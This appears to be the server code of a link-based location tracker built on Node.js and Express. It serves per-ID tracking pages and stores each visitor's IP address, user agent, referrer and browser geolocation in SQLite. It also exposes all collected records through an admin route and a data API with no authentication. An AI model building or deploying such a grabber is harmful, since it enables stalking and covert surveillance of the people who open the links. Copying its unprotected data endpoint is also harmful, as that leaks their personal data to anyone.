const express = require('express');
const Database = require('better-sqlite3');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
    contentSecurityPolicy: false, // Disable CSP for geolocation to work
}));
app.use(cors());
app.use(morgan('combined'));
app.use(express.json());
app.use(express.static('public'));

// Initialize SQLite database
const dbPath = process.env.NODE_ENV === 'production' ? '/tmp/location_data.db' : 'location_data.db';
const db = new Database(dbPath);

// Create table if it doesn't exist
db.exec(`CREATE TABLE IF NOT EXISTS visits (
    id TEXT PRIMARY KEY,
    ip_address TEXT,
    user_agent TEXT,
    latitude REAL,
    longitude REAL,
    accuracy REAL,
    location_permission TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    country TEXT,
    city TEXT,
    referrer TEXT
)`);

// Helper function to get client IP
function getClientIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
           req.ip;
}

// Route to serve the tracking page
app.get('/track/:id', (req, res) => {
    const trackingId = req.params.id || 'default';
    res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// Route to serve the tracking page without ID
app.get('/track', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// API endpoint to capture location data
app.post('/api/capture', (req, res) => {
    const {
        latitude,
        longitude,
        accuracy,
        permission,
        country,
        city
    } = req.body;

    const visitId = uuidv4();
    const ipAddress = getClientIP(req);
    const userAgent = req.headers['user-agent'] || '';
    const referrer = req.headers.referer || '';

    try {
        // Insert data into database
        const stmt = db.prepare(`INSERT INTO visits
            (id, ip_address, user_agent, latitude, longitude, accuracy, location_permission, country, city, referrer)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);

        stmt.run(
            visitId,
            ipAddress,
            userAgent,
            latitude,
            longitude,
            accuracy,
            permission,
            country,
            city,
            referrer
        );

        console.log(`New visit captured: ${visitId} from IP: ${ipAddress}`);
        res.json({
            success: true,
            visitId: visitId,
            message: 'Data captured successfully'
        });
    } catch (err) {
        console.error('Database error:', err);
        res.status(500).json({ error: 'Failed to save data' });
    }
});

// API endpoint to get all captured data (admin dashboard)
app.get('/api/data', (req, res) => {
    try {
        const stmt = db.prepare(`SELECT * FROM visits ORDER BY timestamp DESC`);
        const rows = stmt.all();
        res.json(rows);
    } catch (err) {
        console.error('Database error:', err);
        res.status(500).json({ error: 'Failed to retrieve data' });
    }
});

// Admin dashboard route
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Root route
app.get('/', (req, res) => {
    res.json({
        message: 'Location Tracker API',
        endpoints: {
            track: '/track/:id - Tracking page',
            admin: '/admin - Admin dashboard',
            api: {
                capture: 'POST /api/capture - Capture location data',
                data: 'GET /api/data - Get all captured data'
            }
        }
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Tracking page: http://localhost:${PORT}/track`);
    console.log(`Admin dashboard: http://localhost:${PORT}/admin`);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\nShutting down server...');
    try {
        db.close();
        console.log('Database connection closed.');
    } catch (err) {
        console.error('Error closing database:', err);
    }
    process.exit(0);
});
